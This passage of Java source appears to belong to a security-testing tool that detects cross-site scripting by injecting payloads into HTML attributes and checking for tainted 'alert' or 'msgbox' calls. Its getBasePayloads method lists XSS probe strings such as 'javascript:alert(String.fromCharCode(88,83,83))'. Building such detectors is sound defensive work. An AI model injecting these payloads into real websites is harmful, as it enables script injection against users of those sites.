	 * original String. */
	private static String unquote(String str) {
		if(str == null || str.length() < 2) {
			return str;
		}
		char first = str.charAt(0);
		char end = str.charAt(str.length() - 1);
		if(first == end && (first == '"' || first == '\'' || first == '`')) {
			return str.substring(1, str.length() - 1);
		} else {
			return str;
		}
	}

	/* Checks the specified attribute value String for JavaScript or VBScript injections. */
	private boolean checkAttributeValueForScripts(String s) {
		if(s == null || s.length() == 0) {
			return false;
		}
		s = ParseUtils.unescapeHtmlReferencesEnsuringTags(ParseUtils.removeDummyPositionTags(unquote(s.toLowerCase())).trim());
		if(s.startsWith("javascript:")) {
			return checkScript(s.substring("javascript:".length()), true, true);
		} else if(s.startsWith("vbscript:")) {
			return checkScript(s.substring("vbscript:".length()), false, true);
		} else {
			return false;
		}
	}

	/* Check the specified attribute value String for the url payload. Returns whether a critical violation should be
	 * reported for the specified attribute value. */
	private boolean checkAttributeValueForUntrustedURL(String s) {
		if(s == null || s.length() == 0) {
			return false;
		}
		s = ParseUtils.unescapeHtmlReferencesEnsuringTags(ParseUtils.removeDummyPositionTags(unquote(s.toLowerCase())).trim());
		return s.equals(MALICIOUS_URL) && containsTaintedChar(s);
	}

	/* Checks the specified VBScript or JavaScript String for the uncommented, unquoted tainted String "alert" or "msgbox"
	 * in the case of VBScript. Returns whether a critical violation should reported for the specified script String. */
	private boolean checkScript(String s, boolean isJavaScript, boolean isAttributeValue) {
		if(s == null || s.length() == 0) {
			return false;
		}
		s = ParseUtils.removeDummyPositionTags(s.toLowerCase());
		if(isAttributeValue) {
			s = ParseUtils.unescapeHtmlReferencesEnsuringTags(s);
		}
		String target = isJavaScript ? "alert" : "msgbox";
		List<String> code = isJavaScript ? ParseUtils.parseJavaScript(s).get(0) : ParseUtils.parseVBScript(s).get(0);
		for(String chunk : code) {
			while(chunk.contains(target)) {
				int start = chunk.indexOf(target);
				int end = start + target.length();
				String next = chunk.substring(start, end);
				if(containsTaintedChar(next)) {
					// Tainted target string found
					return true;
				}
				chunk = chunk.substring(end);
			}
		}
		return false;
	}

	/* Returns the decimal character reference of the specified string padded out to the full 7 digit width. */
	private static String encodeToPaddedDecimalCharReference(String s) {
		StringBuilder builder = new StringBuilder(s.length());
		for(int i = 0; i < s.length(); i++) {
			builder.append("&#");
			builder.append(String.format("%07d", (int)s.charAt(i)));
		}
		return builder.toString();
	}

	@Override
	public List<String> getTargetedBaseSinks() {
		return targetedSinks;
	}

	/* Return whether the specified baseSink is one that is used to check for XSS attacks. */
	public static boolean isXssSink(String baseSink) {
		return targetedSinks.contains(baseSink);
	}

	/* Describes types of XSS attacks to which an attribute is be vulnerable. */
	private enum AttributeVulnerabilityType {
		EXTERNAL_SCRIPT, EMBEDDED_SCRIPT, EXTERNAL_AND_EMBEDDED_SCRIPT, EVENT, NONE;

		/* Returns the AttributeVulnerabilityType that describes the types of attacks that the specified attribute key
		 * for the specified tag is vulnerable to. */
		static AttributeVulnerabilityType getVulnerability(String tagName, String attributeKey) {
			tagName = tagName.toLowerCase().trim();
			attributeKey = attributeKey.toLowerCase().trim();
			for(String handler : EVENT_HANDLER_ATTRIBUTES) {
				if(handler.equals(attributeKey)) {
					return EVENT;
				}
			}
			boolean script = false;
			boolean url = false;
			if(attributeEmbeddedScriptCheckMap.containsKey(tagName)) {
				for(String key : attributeEmbeddedScriptCheckMap.get(tagName)) {
					if(key.equals(attributeKey)) {
						script = true;
						break;
					}
				}
			}
			if(attributeExternalScriptCheckMap.containsKey(tagName)) {
				for(String key : attributeExternalScriptCheckMap.get(tagName)) {
					if(key.equals(attributeKey)) {
						url = true;
						break;
					}
				}
			}
			if(script && url) {
				return EXTERNAL_AND_EMBEDDED_SCRIPT;
			} else if(script) {
				return EMBEDDED_SCRIPT;
			} else if(url) {
				return EXTERNAL_SCRIPT;
			} else {
				return NONE;
			}
		}

		/* Returns a list of standard payloads for this vulnerability type. */
		String[] getBasePayloads() {
			switch(this) {
				case EXTERNAL_SCRIPT:
					return new String[]{MALICIOUS_URL, MALICIOUS_URL_CHAR_REF};
				case EMBEDDED_SCRIPT:
					return new String[]{"javascript:alert(String.fromCharCode(88,83,83))", JAVASCRIPT_ALERT_CHAR_REF};
				case EXTERNAL_AND_EMBEDDED_SCRIPT:
					return new String[]{MALICIOUS_URL, MALICIOUS_URL_CHAR_REF, "javascript:alert(String.fromCharCode(88,83,83))", JAVASCRIPT_ALERT_CHAR_REF};
				case EVENT:
					return new String[]{ALERT_CHAR_REF, "alert(String.fromCharCode(88,83,83))"};
				default:
					return new String[0];
			}
		}
	}
}

